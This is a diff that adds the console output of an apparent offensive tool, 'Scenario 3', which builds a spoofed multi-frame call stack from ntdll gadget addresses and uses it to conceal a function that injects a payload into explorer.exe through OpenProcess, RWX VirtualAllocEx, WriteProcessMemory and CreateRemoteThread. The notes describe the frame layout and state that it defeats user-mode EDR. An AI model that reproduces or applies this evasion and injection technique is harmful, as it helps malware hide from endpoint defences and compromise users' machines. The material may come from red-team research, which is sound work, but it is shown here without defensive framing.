@@ -1,0 +1,55 @@
+================================================================================
+  SCENARIO 3: MULTI-FRAME CHAIN SPOOFED INJECTION
+================================================================================
+
+[INFO] Building TRUE 2-frame deep call chain using recursive spoofing
+[INFO] Expected: structurally valid chain, SP in TEB bounds, attribution redirected to ntdll
+
+  Multi-frame chain composition:
+[DEBUG] Selected gadget[117/512]: 0x00007FFE81EF55E4
+    Frame[0]: 0x00007FFE81EF55E4 (RtlWow64GetProcessMachines+0xA4)
+[DEBUG] Selected gadget[64/512]: 0x00007FFE81EF449C
+    Frame[1]: 0x00007FFE81EF449C (LdrControlFlowGuardEnforced+0x14C)
+[DEBUG] Selected gadget[89/512]: 0x00007FFE81EF4CB4
+    Frame[2]: 0x00007FFE81EF4CB4 (LdrControlFlowGuardEnforced+0x964)
+
+[INFO] Executing with 2 levels of recursion, each with spoofed return
+
+  [>] Executing concealed function: InjectExplorer
+      Target: explorer.exe -- full injection pattern
+
+  [STACK TRACE] From inside InjectExplorer (user-mode view):
+      [00] InjectExplorer                           + 0x0060 <-- TARGET
+      [01] LdrControlFlowGuardEnforced              + 0x0964
+      [02] RecursiveSpoofHelper                     + 0x0030
+      [03] LdrControlFlowGuardEnforced              + 0x014C
+      [04] RecursiveSpoofHelper                     + 0x0064
+      [05] RtlWow64GetProcessMachines               + 0x00A4
+      [06] RecursiveSpoofHelper                     + 0x0064
+      [07] mainCRTStartup                           + 0x0014
+      [08] BaseThreadInitThunk                      + 0x0040
+      [09] RtlUserThreadStart                       + 0x0044
+  [>] Found explorer.exe PID: 4872
+  [>] OpenProcess handle: 0x0000000000000148
+  [>] VirtualAllocEx RWX at: 0x00000000040C0000
+  [>] WriteProcessMemory: 16 bytes written
+  [>] CreateRemoteThread: TID handle 0x0000000000000140
+
+  [>] Injection complete -- payload executed in explorer.exe
+
+[SUCCESS] Multi-frame spoofed injection completed in 93843 ms
+[INFO] Result: 0x00000001
+[INFO] 2 spoofed frames visible in call stack
+
+Notes:
+- CBT (10 frames): pattern gadget/RSH/gadget/RSH/gadget/RSH repeating.
+  Gadgets at [01][03][05], RecursiveSpoofHelper at [02][04][06].
+  Frame [02]: RSH+0x0030 (base-case call to SpoofCallStack via BL at +0x2C).
+  Frame [04][06]: RSH+0x0064 (recursive-case call to SpoofCallStack via BL).
+  mainCRTStartup at [07]: main() is absent (optimized out of x29 chain by /O2).
+- SP in TEB bounds: structurally valid chain -- hardest case for user-mode EDR.
+- CHAIN_DEPTH=2 in this run (code constant); old analysis used CHAIN_DEPTH=3.
+- Gadgets (ntdll 0x00007FFE81EF0000 base):
+    Frame[0] = RtlWow64GetProcessMachines+0xA4    (0x00007FFE81EF55E4)
+    Frame[1] = LdrControlFlowGuardEnforced+0x14C  (0x00007FFE81EF449C)
+    Frame[2] = LdrControlFlowGuardEnforced+0x964  (0x00007FFE81EF4CB4)
